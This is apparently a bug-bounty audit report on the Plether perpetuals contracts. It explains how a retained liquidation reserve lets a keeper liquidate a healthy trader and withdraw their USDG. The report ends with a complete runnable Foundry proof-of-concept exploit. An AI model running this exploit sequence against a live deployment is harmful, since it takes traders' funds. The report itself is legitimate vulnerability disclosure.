# \#98841 [SC-Medium] Retained liquidation reserve allows premature liquidation and transfers a healthy trader's USDG to a permissionless keeper

**Submitted on Nov 10th 2026 at 14:17:25 UTC by @Pig46940 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98841
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An increase can lower a position's current notional and therefore its required liquidation reserve, yet the open planner keeps the older, larger reserve. The excess remains excluded from price-risk collateral. An account that has enough collateral under the documented current-target allocation can consequently be classified as liquidatable. Any permissionless keeper can liquidate it, receive a share of the liquidation charge, and withdraw the trader-funded USDG.

## Vulnerability Details

The accounting specification defines the reserve target after an open or increase as the greater of the minimum bounty and 0.1% of the resulting notional at the configured launch parameters. It says approved position collateral beyond that target is PnL pledge. An increase can reduce the resulting notional when its execution price falls enough to offset the additional size.

The open planner computes that current target and then replaces it with the older reserve whenever the target is lower:

~~~solidity
delta.liquidationReserveAfterAssets = delta.openState.liquidationReserveTargetAssets;
if (delta.liquidationReserveAfterAssets < delta.liquidationReserveBeforeAssets) {
    delta.liquidationReserveAfterAssets = delta.liquidationReserveBeforeAssets;
}
uint256 reserveIncreaseAssets =
    delta.liquidationReserveAfterAssets - delta.liquidationReserveBeforeAssets;
delta.positionMarginAfterOpen =
    openCostPlan.resultingPositionMarginAssets
    - delta.vpiRebateReserveFromPledgeAssets
    - reserveIncreaseAssets;
~~~

This retains the excess in the dedicated liquidation bucket instead of reclassifying it as position pledge. The excess is still part of the trader's physical settlement balance, but liquidation health deliberately reads position margin and same-account claims, excluding the liquidation reserve:

~~~solidity
delta.riskState = PositionRiskAccountingLib.buildExactPriceRiskState(
    pos,
    snap.positionEntryCostAssetAtoms,
    price,
    snap.capPrice,
    pos.margin + snap.traderClaimBalanceForAccount,
    maintMarginBps
);
~~~

Let B be retained reserve minus the documented current reserve target. If implemented equity is at or below maintenance while implemented equity plus B is above maintenance, the reserve classification alone changes a healthy position into a liquidatable one. No missing deposit or oracle manipulation is needed for this accounting gap.

The Router's liquidation entry is permissionless. Liquidation charges the trader's dedicated reserve and credits the keeper. The keeper may then call MarginClearinghouse.withdraw to receive the settlement token in its wallet.

~~~solidity
state.keeperBountyAssets =
    Math.mulDiv(liquidationChargeAssets, keeperShareBps, 10_000);

settlementBalances[execution.keeper] += execution.keeperBountyAssets;
~~~

The first faulty transition is the old-reserve retention during the increase. The later liquidation health check consumes the understated pledge. The settlement code then performs the value transfer; this is not merely a preview discrepancy.

## Impact Details

**Affected owner:** the trader whose collateral was placed in the excess liquidation-reserve bucket. **Recipient:** an unrelated permissionless liquidator. The trader loses its open position and pays a liquidation charge that would not be due under the documented current-target collateral allocation. With the launch keeper share of 50%, part of that trader-funded charge is credited to the keeper and is withdrawable as USDG. The remainder is allocated to the Pool under the ordinary liquidation split. The direct token payout supports the program's listed Critical impact, “Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.”

The amount of excess reserve required to cross the health threshold can be small; once the account falls into that threshold window, the liquidation charge is calculated from the full notional and capped by reachable collateral and the reserve, not by the size of the classification error. Thus a small classification error can trigger a much larger real transfer. The PoC below measures both the independent health comparison and the keeper's final token balance.

## References

- [Accounting specification: liquidation-reserve target and PnL pledge](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L806-L813)
- [First faulty reserve allocation in CfdEnginePlanLib](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L548-L579)
- [Liquidation health excludes the dedicated reserve](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1450-L1467)
- [Keeper share of the charge](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L65-L78)
- [Clearinghouse keeper credit and debit of trader balance](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1234-L1272)
- [Permissionless Router liquidation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L488-L500)
- [Competition scope and impact list](https://immunefi.com/audit-competition/plether/scope/)


## Proof of Concept

## Proof of Concept

This is one deterministic, runnable Foundry test. It uses the pinned in-scope production contracts unchanged and the repository's out-of-scope mock USDG/Pyth fixture. No public network transaction is required.

From the pinned repository root, create the test directory:

~~~bash
mkdir -p packages/perps/test/perps/POC
~~~

Save the Solidity code below as packages/perps/test/perps/POC/testHealthyTraderLosesFundsToPermissionlessLiquidator.t.sol. Then run:

~~~bash
cd packages/perps
forge test --match-path test/perps/POC/testHealthyTraderLosesFundsToPermissionlessLiquidator.t.sol \
  --match-test test_HealthyTraderLosesFundsToPermissionlessLiquidator -vv --threads 2
~~~

The test opens and increases an ordinary position through public delayed orders. It compares implemented equity with the documented current-target allocation, executes an actual permissionless liquidation, and has the keeper withdraw its bounty. The decisive expected output is one passing test, 11,000 USDG atoms of misclassified collateral, implemented equity below maintenance, and 55,000,000 USDG atoms received by the keeper's wallet. The price updates are local Pyth mocks; they prove the contract transition under a selected valid price fixture, rather than a historical signed six-feed market path.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice A healthy trader is liquidated because an old reserve is withheld from price collateral.
contract PfNew04TheftPoC is BasePerpTest {
    address private constant TRADER = address(0xA11CE);
    address private constant KEEPER = address(0xB0B);

    uint256 private constant OPEN_SIZE = 110_000e18;
    uint256 private constant INCREASE_SIZE = 1_100e18;
    uint256 private constant OPEN_PRICE = 100_000_000;
    uint256 private constant INCREASE_PRICE = 99_000_000;
    uint256 private constant LIQUIDATION_PRICE = 100_163_560;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function test_HealthyTraderLosesFundsToPermissionlessLiquidator() public {
        _fundTrader(TRADER, 1_000e6);
        _executeTraderIncrease(OPEN_SIZE, 500e6, OPEN_PRICE);
        _executeTraderIncrease(INCREASE_SIZE, 20e6, INCREASE_PRICE);

        uint256 actualReserve = clearinghouse.liquidationReserveAssets(TRADER);
        uint256 currentNotional = (OPEN_SIZE + INCREASE_SIZE) * INCREASE_PRICE / 1e20;
        uint256 requiredReserve = currentNotional * 10 / 10_000;
        uint256 wronglyReservedCollateral = actualReserve - requiredReserve;
        assertEq(actualReserve, 110e6);
        assertEq(requiredReserve, 109_989_000);
        assertEq(wronglyReservedCollateral, 11_000);

        uint256 freeCash = clearinghouse.balanceAssets(TRADER) - clearinghouse.lockedMarginAssets(TRADER);
        vm.prank(TRADER);
        clearinghouse.withdraw(TRADER, freeCash);

        ICfdEngineTypes.LiquidationPreview memory preview =
            engineLens.previewLiquidation(TRADER, LIQUIDATION_PRICE);
        (uint256 positionSize,,,,,,) = engine.positions(TRADER);
        uint256 maintenance = positionSize * LIQUIDATION_PRICE / 1e20 * 10 / 10_000;
        assertTrue(preview.liquidatable, "implementation admits liquidation");
        assertLe(preview.equityAssets, int256(maintenance), "implemented pledge fails maintenance");
        assertGt(
            preview.equityAssets + int256(wronglyReservedCollateral),
            int256(maintenance),
            "documented current-target allocation keeps the same trader healthy"
        );

        uint256 keeperCashBefore = clearinghouse.balanceAssets(KEEPER);
        uint256 keeperWalletBefore = settlementToken.balanceOf(KEEPER);
        uint256 traderCashBefore = clearinghouse.balanceAssets(TRADER);

        bytes[] memory liquidationPriceData = _mockPythUpdateData(LIQUIDATION_PRICE);
        vm.prank(KEEPER);
        router.executeLiquidation(TRADER, liquidationPriceData);

        (uint256 remainingPositionSize,,,,,,) = engine.positions(TRADER);
        uint256 keeperCredit = clearinghouse.balanceAssets(KEEPER) - keeperCashBefore;
        assertEq(remainingPositionSize, 0, "the trader's position was forcibly closed");
        assertEq(keeperCredit, 55e6, "keeper receives half of the 110 USDG charge");
        assertLt(clearinghouse.balanceAssets(TRADER), traderCashBefore);

        vm.prank(KEEPER);
        clearinghouse.withdraw(KEEPER, keeperCredit);
        assertEq(
            settlementToken.balanceOf(KEEPER) - keeperWalletBefore,
            55e6,
            "permissionless keeper withdraws real trader-funded USDG"
        );

        emit log_named_uint("wrongly reserved collateral atoms", wronglyReservedCollateral);
        emit log_named_int("implemented equity atoms", preview.equityAssets);
        emit log_named_uint("maintenance requirement atoms", maintenance);
        emit log_named_uint("keeper wallet gain atoms", settlementToken.balanceOf(KEEPER) - keeperWalletBefore);
    }

    function _executeTraderIncrease(uint256 size, uint256 margin, uint256 price) private {
        vm.prank(TRADER);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, size, margin, 0, false);
        bytes[] memory priceData = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory execution = router.executeOrder(orderId, priceData);
        assertEq(uint8(execution.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }
}
~~~

